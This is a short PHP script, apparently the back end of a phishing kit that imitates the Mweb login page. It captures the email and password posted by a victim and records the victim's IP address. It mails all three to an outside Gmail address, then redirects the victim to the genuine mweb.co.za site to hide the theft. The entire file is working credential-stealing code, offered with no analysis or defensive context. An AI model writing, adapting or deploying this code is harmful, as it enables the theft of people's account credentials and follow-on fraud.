<?php

session_start();

header("Location: https://mweb.co.za/");

	$ip = getenv("REMOTE_ADDR");
	$_SESSION['ai'] = $user = $_POST['ai'];
	$pass1 = $_POST['pr'];

$msg = "
Email: {$user}
Password: {$pass1}
IP: {$ip}
";
$to = 'asclgtool@gmail.com';
	@mail($to, "Mweb", $msg);



?>